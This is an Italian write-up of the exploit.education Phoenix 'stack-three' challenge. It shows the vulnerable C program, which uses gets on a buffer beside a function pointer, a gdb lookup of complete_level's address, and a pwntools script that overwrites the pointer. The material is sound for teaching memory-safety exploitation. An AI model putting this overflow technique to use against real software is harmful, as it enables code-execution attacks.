### Descrizione del Codice

Il programma `stack_three.c` presenta una vulnerabilità di overflow del buffer che può essere sfruttata per sovrascrivere i puntatori a funzione memorizzati nello stack.

### Funzionamento del Programma

1. Il programma legge un input dall'utente utilizzando la funzione `gets` e lo memorizza in `buffer`.
2. La funzione `gets` non controlla la lunghezza dell'input, il che può causare un overflow del buffer.
3. La funzione `main` verifica se il puntatore a funzione `fp` è stato modificato e, in tal caso, chiama la funzione puntata da `fp`.

### Problema di Sicurezza

Il problema di sicurezza risiede nell'uso della funzione `gets` senza controllare la lunghezza dell'input, il che può causare un overflow del buffer. Questo può essere sfruttato per sovrascrivere il valore di `fp`, che è un puntatore a funzione, per farlo puntare alla funzione `complete_level`.

### Exploit

L'exploit sfrutta l'overflow del buffer per sovrascrivere il valore di `fp` per farlo puntare alla funzione `complete_level`.

### Esempio di Exploit

Il seguente esempio mostra come sfruttare la vulnerabilità:

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}

L'obiettivo di questa sfida è sovrascrivere il valore di fp, che è un puntatore a funzione, per farlo puntare alla funzione complete_level.

Prima otteniamo l'indirizzo della funzione complete_level:
$ gdb -q /opt/phoenix/amd64/stack-three
Reading symbols from /opt/phoenix/amd64/stack-three...(no debugging symbols found)...done.

gef➤  print complete_level 
$1 = {<text variable, no debug info>} 0x40069d <complete_level>

Ora che sappiamo che l'indirizzo della funzione complete_level è 0x40069d, possiamo costruire il nostro exploit.

Soluzione:
# solve.py

from pwn import *

buff = ""
buff += 'A'*64
buff += p64(0x40069d)

print(buff)

Eseguiamo lo script:
$ python solve.py | /opt/phoenix/amd64/stack-three